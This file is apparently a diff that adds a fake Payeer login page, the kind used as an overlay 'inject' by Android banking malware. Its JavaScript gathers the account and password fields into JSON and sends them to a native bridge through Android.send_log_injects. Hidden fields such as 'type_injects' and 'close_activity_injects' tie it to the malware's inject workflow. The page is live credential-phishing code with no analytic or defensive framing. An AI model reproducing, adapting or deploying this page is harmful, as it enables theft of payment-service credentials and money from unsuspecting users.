@@ -1,0 +1,330 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+    <title>Payyer</title>
+</head>
+<style>
+html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}
+body {
+          background: #2486ff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+
+}
+html {
+    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+.header {
+    position: relative;
+    z-index: 2;
+}
+.logongardient {
+    
+    margin-top: 50px;
+    text-align: center;
+}
+.logo {
+    margin: 0 auto;
+    text-align: center;
+}
+.main {
+    margin-top: 10px;
+}
+.autorizeBox {
+    border-radius: 5px;
+    padding: 1.25rem 0;
+    max-width: 384px !important;
+    overflow: visible !important;
+    margin: 0 auto;
+}
+@media only screen and (max-width: 444px) {
+    .autorizeBox {
+        margin: 0 20px;
+    }
+}
+.autorizeBox form {
+    position: relative;
+    min-height: .0625rem;
+    padding: 5px 35px;
+}
+.autorizeBox ::placeholder {
+    color: #1fd48f;
+    opacity: 1;
+}
+.autorizeBox label {
+    font-size: 1.125rem;
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    margin-left: 5px;
+}
+.autorizeBox input {
+    background: #fff;
+    color: #000;
+    font-size: 1.125rem;
+    border: none;
+    padding: 10px 7px;
+    margin: 10px 0;
+    width: 96%;
+}
+.autorizeBox input.dt {
+    width: 17%;
+}
+.autorizeBox button {
+    margin: 30px 0;
+    background-color: #38968700;
+    border: solid #fff 0.6px;
+    color:  #fff;
+    width: 80%;
+    height: 2.0rem;
+    overflow-x: auto;
+    text-align: auto;
+    vertical-align: middle;
+    cursor: pointer;
+	margin-left: 40px;
+}
+.autorizeBox button span {
+    line-height: 1.125rem;
+    white-space: normal;
+    margin: .0625rem .75rem;
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+.footer {
+    font-size: 16px;
+    padding: 1em 0;
+    margin-top: 50px;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    color: #757575;
+    font-size: .65625rem;
+    text-align: center;
+}
+.footer p {
+    margin: 25px 0;
+}
+#ccnumlbl {
+    color: red;
+    font-size: 0.8rem;
+}
+.warntext {
+    color: red;
+    margin-bottom: 20px;
+    text-align: center;
+    font-weight: bolder;
+}
+INPUT[type="text"] {
+  margin-bottom: 1.25em;
+    height: 44px;
+    width: 100%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #20b37b;
+    background: #fff0;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #fff;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    direction: ltr;
+}
+INPUT[type="text"]:focus {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+    border: solid #fff 0.7px;
+	
+}
+
+INPUT[type="password"] {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+  margin-bottom: 1.25em;
+    height: 44px;
+    width: 100%;
+    padding: 0 10px;
+    border: none;
+    border-bottom: 1px solid #20b37b;
+    background: #fff0;
+    background-clip: border-box;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #fff;
+    font-size: 1em;
+    font-family: Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    font-weight: 400;
+    direction: ltr;
+}
+INPUT[type="password"]:focus {
+    background-color: #fff0; /* Цвет фона */
+    color: #fff; /* Цвет текста */
+    border: solid #fff 0.7px;
+}
+
+
+</style>
+<body>
+    <div class="header"><div class="logongardient">
+           
+			<h3>	<center><font color="white">Log ln</font>
+			<h6>	<center><font color="white">Login in to your payeer Account</font>
+
+    </div></div>
+
+
+
+    <div class="main">
+        <div class="autorizeBox">
+		
+            <form id="login" action="">
+               <h6>	<font color="000">Acount number, email or phone</font> 
+                    <input class="colorX" id="Login" placeholder="" pattern=".{4,}" autocomplete="off" type="text" required><img style="background: none; border: none;position: absolute;top: 60px;right:43px;width: 23px;z-index: 999999;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFQAAABUCAQAAAC2YthKAAAEw0lEQVRo3u1bP2gbVxz+ntGgwg2CCqpSQa6gwVBDNXjwkIKghnowxIOhgnYQNIOhHjKkWwaDBw8qmCKKhw4ePJTgFBkyuJAhQwupiSEuoqQgQwR2iSAqMrhggQxfB8mW5Oju3u/dO1mG/BYj+fTed/d+f77fn1MIKUzgNrK4BRcuEkh2v27gBHXUUMOfOEBNneO6hA5nWeRzthksTZaZZ2L0IOe4xVNKpc0y84yPBmKS9/mSYeQ1HzAZNcgiz2hD2lxnKhqQMa6wSZvS5Jp1NWCOLxiFVDhr81mWtCzbVDatPFem+YxRS4VueDf0hqOQUy6Egbkc6ZFflWVTmPdGCpMk7/vhUV4wsS6+txYOsI9/AXwEF9OQh8zv1PdRH/pvzNO54i3yfB6pAnBOCPOUdxnzWCsvDhML+g5JZulHzPqul2FVeNsZPfcu85vV4JjNBCtCv+oEAy0JycWk1inNCEnhZnBMl2nnqsDZyWTW/9hl1ONMn1fSERpVxYcBcEV41xsil7chXH3NmxY3LR7PMKcn5avDzZRFsXMWJRRMiINIaUgIZRJHkPHClnpPyB6OkBb94BwfqsbFh4nu3wKk9LUujuTS3D6GpbfvVp5ZNsV8TM5tX/VC80RH0TEpfj4JWQrBOORJsovZwaP/yoiyZkVXTxnt8U0fUDowSwRkGeSc0R7zF4WgCQAzcIwWuSM6+G+N9ogj1wP6hWG2Ms157WvvwrQy8nnvbuU8vGeVWmfBVIgqS8U8YgjjPePcDZX0dbwF56OtdNDh45A7LHZ0NItwUsCud9RnGk8xH3KHTztAb4Wu++RQ5erbXIcJrqCC6dDruwCg+AR2KmotPMIe/kYN50hhEneQg51i+O/qM0CxigzGW2rqY2ACCYy7OJ2j59gDhVI9Pjr28g6ofaCNscfY6OQlDdhsT9XRAhBDCjFra550gB4bpCH9Cdsx9vEXDnCIhqr3Mya4cPEJpjElzD6HppEx1EzdMH7FQ+yr/zxcSh11/NEF7WIOX2IGccOdAIAPDHpuG5wx6AokWOCuAalcNaF5L3kvXDubGRaFRcjFiwqzrrzhMq2YCNNcE4DNyAoD20zb9DnMaNa2m5cPh1saly/Zd4+Mc1Nj53LvBwvXAbO793rg3vn+rOYsVEU9HNTHAV2CftPltm8BPBUpUNfXrMqDpOQXn5V2VD1KoKqGHZ9/PxwE+gjHnpfuRU469nyC584AUHWOHzwvfj9yoN6k6EfVuqopSU+DanMqUh3NeOpoe2i9wKfZ8Co6c2Lcp7dVGv4Tv/bNEzoRAf1J3L4JaIjtMjZSmN4NscAW47btcSrfXl7Fd7eApu1Te/OKdAIYRlCZKaANXmXWCszJgHZRcNAOHCxocyWstnIpgItWtExXY1TjBXPGIG8HstBT6iabWsMv23IlYJZljZUlrSTNcaJnLOipAeNc1EzrpPNk2qMVTf7MgneSwil+zS2+Dj9LpryhoiiodpyghkOc4J/u5w+QhIusqF4inSMTKsB1DxF2zao5EpDhxjK7zmoUg642ugiMcSPi0WF7zOxGDGNfPtebMN5+Sa2LlpSgzVK0SfjNeAVjwG2N+0stA9R3pK8JqdCA/V68Osbhtb949U485H8OnAQAycIpqgAAAABJRU5ErkJggg==
+">
+					<h6>	<font color="000">Password</font>
+
+                                        <input class="colorX" id="Password" placeholder="" pattern=".{4,}" autocomplete="off" type="password"  required><img width="10"  style="background: none; border: none;position: absolute;top: 170px;right: 45px;width: 16px;z-index: 999999;" src="https://imgsh.net/images/2020/03/24/ic_edit_password.png">
+                    <input id="type_injects" value='crypt' type="hidden" required>
+                    <input id="closed" value='close_activity_injects' type="hidden" required>
+
+
+					
+					<h6>	<font color="white">l FORGOT MY PASSWORD</font>
+                    <button type="button" onclick="process('login')"><span>Login</span></button>
+							
+			<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+						
+<h4>	<center><font color="white">SİGN UP  ></font>
+				
+            </form>
+        </div>
+    </div>
+    <div style="margin-top: -10px">
+    <center>
+        
+       
+    </center>
+    </div>
+</body>
+<script>
+        
+        var allButtons = document.getElementsByTagName('button');
+        for(var btn in allButtons) {
+            allButtons[btn].disabled = true;
+        }
+        
+        function CheckValidInput(id) {
+            var finalbool = true, formids = document.getElementById(id);
+            var currentinputs = formids.getElementsByTagName('input');
+            for(var i = 0; i < currentinputs.length; i++ ) {
+                finalbool &= currentinputs[i].checkValidity();
+            }
+            formids.getElementsByTagName('button')[0].disabled = !finalbool;
+        }
+        
+        var AllForms = document.getElementsByTagName('form');
+        for(var i = 0; i < AllForms.length; i++) {
+            var myInputs = AllForms[i].getElementsByTagName('input');
+            for(var j = 0; j < myInputs.length; j++) {
+                AddInputEventByFormID(myInputs[j],AllForms[i].id);
+            }
+        }
+        
+        function AddInputEventByFormID(input, formid) {
+            input.addEventListener('input', function(){CheckValidInput(formid)});
+        }
+        
+        function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+        /*********Recursive implementation of jSON.stringify; ********/
+        var stringifyJSON = function(obj) {
+            var arrOfKeyVals = [],
+                arrVals = [],
+                objKeys = [];
+        
+            /*********CHECK FOR PRIMITIVE TYPES**********/
+            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+                return '' + obj;
+            else if (typeof obj === 'string')
+                return '"' + obj + '"';
+        
+            /*********CHECK FOR ARRAY**********/
+            else if (Array.isArray(obj)) {
+                if (obj[0] === undefined)
+                    return '[]';
+                else {
+                    obj.forEach(function(el) {
+                        arrVals.push(stringifyJSON(el));
+                    });
+                    return '[' + arrVals + ']';
+                }
+            }
+            /*********CHECK FOR OBJECT**********/
+            else if (obj instanceof Object) {
+                objKeys = Object.keys(obj);
+                objKeys.forEach(function(key) {
+                    var keyOut = '"' + key + '":';
+                    var keyValOut = obj[key];
+                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                        arrOfKeyVals.push('');
+                    else if (typeof keyValOut === 'string')
+                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                        arrOfKeyVals.push(keyOut + keyValOut);
+                    else if (keyValOut instanceof Object) {
+                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                    }
+                });
+                return '{' + arrOfKeyVals + '}';
+            }
+        };
+        
+        function formToJSON(f)
+        {
+            var FinalObject = {}, namesHTML = ['input','select'];
+            for(var i = 0; i < namesHTML.length; i++) {
+                var bsform = f.getElementsByTagName(namesHTML[i]);
+                for(var j = 0; j < bsform.length; j++) {
+                    FinalObject[bsform[j].id] = bsform[j].value
+                }
+            }
+            return stringifyJSON(FinalObject);
+        }
+        </script>
+        </html>
